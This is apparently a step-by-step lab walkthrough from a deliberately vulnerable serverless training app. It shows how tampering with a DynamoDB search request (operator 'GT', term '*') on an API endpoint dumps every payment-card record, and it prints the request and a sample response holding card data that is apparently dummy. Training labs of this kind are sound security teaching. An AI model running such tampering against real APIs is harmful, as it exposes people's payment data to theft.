# **IAM Permission Flaw**


### *  *

-------

#### Step 1:

* Access the [XML-Uploader](http://sls-training-ui.s3-website-us-east-1.amazonaws.com/) Application on the browser.

```commandline
http://sls-training-ui.s3-website-us-east-1.amazonaws.com/
```

* Register and Login to the Application

### *Note: The details provided CAN be fake and we highly recommend it!*

-------

#### Step 2:

* Once logged in, select the `Networks` tab that can be found in `developer tools`

* Click on the `Search` icon to search for information.

* Search for user related information. Copy the `URL` and `Params` for the request made in the `Networks` tab

-------

#### Step 3:

* Tamper the `Param` value to get all the `payment card` details from the database

```commandline
http POST https://a2to86jcrb.execute-api.us-east-1.amazonaws.com/api/bad_dynamo_search <<<'{
        "db": "2htw3dwxnc-payment-cards",
        "search_field": "card_number",
        "search_operator": "GT",
        "search_term": "*"
    }
```

### *It should return with a response similar to the one below:*

```commandline
HTTP/1.1 200 OK
Access-Control-Allow-Headers: Authorization,Content-Type,X-Amz-Date,X-Amz-Security-Token,X-Api-Key
Access-Control-Allow-Origin: *
Connection: keep-alive
Content-Length: 2169
Content-Type: application/json
Date: Tue, 09 Oct 2018 01:32:53 GMT
Via: 1.1 aa89533ad2ec5e0edba466c9920bd000.cloudfront.net (CloudFront)
X-Amz-Cf-Id: X8szCarsQAv9oUWSw82v9hpsA-QyfvP8PlDA1cIIgocKOITW2661dg==
X-Amzn-Trace-Id: Root=1-5bbc0545-5a84835cd05bd8b4bd31a502;Sampled=0
X-Cache: Miss from cloudfront
x-amz-apigw-id: OeXCzHEgoAMFqSw=
x-amzn-RequestId: 3db038ff-cb63-11e8-92a8-adaf88305995
{
    "search_results": [
        {
            "card_number": {
                "S": "4994684175713024"
            },
            "cardholder": {
                "S": "Amanda Smith"
            },
            "exp_date": {
                "N": "523"
            }
        }
    ]
}
```

---------

### Reading Material/References:
